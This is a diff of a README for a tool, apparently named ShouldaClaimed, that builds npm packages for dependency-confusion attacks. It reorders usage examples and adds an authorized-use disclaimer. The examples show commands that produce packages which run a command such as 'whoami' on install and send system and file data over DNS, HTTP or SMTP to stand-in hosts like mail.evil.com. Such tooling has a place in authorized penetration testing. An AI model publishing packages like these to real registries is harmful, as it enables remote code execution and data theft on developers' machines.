@@ -14,6 +14,14 @@ go install github.com/A3-N/ShouldaClaimed@latest
 
 Generate a package to inspect the code or publish manually later.
 
+**RCE with Exfiltration:**
+Execute a command and send the output back via the selected protocol.
+
+```bash
+# Run 'whoami' and send output via SMTP
+ShouldaClaimed create -t internal-utils -p smtp -s mail.evil.com:25 -r "whoami"
+```
+
 **Standard Exfiltration (System & File Info):**
 ```bash
 # DNS (Chunked for reliability)
@@ -21,14 +29,6 @@ ShouldaClaimed create -t internal-utils -p dns -s your-collab.net
 
 # HTTP
 ShouldaClaimed create -t internal-utils -p http -s http://your-collab.net
-```
-
-**RCE with Exfiltration:**
-Execute a command and send the output back via the selected protocol.
-
-```bash
-# Run 'whoami' and send output via SMTP
-ShouldaClaimed create -t internal-utils -p smtp -s mail.evil.com:25 -r "whoami"
 ```
 
 ### 2. Create & Publish
@@ -87,3 +87,10 @@ npm notice
 | `-r` | `--rce` | Command to execute. If set, output is exfiltrated via `-p`. |
 | `-o` | `--out` | Output directory (default: `.`). |
 | `-f` | `--force` | Skip pre-flight checks (NPM installed? Registry collision?). |
+
+---
+#### Authorized use only
+
+This project is intended for authorized security testing and research only.
+
+You may use it only when you have explicit, written permission from the asset owner (or you are the owner). Misuse of this tool may violate laws, contracts, and acceptable-use policies. The authors and contributors assume no liability for misuse.
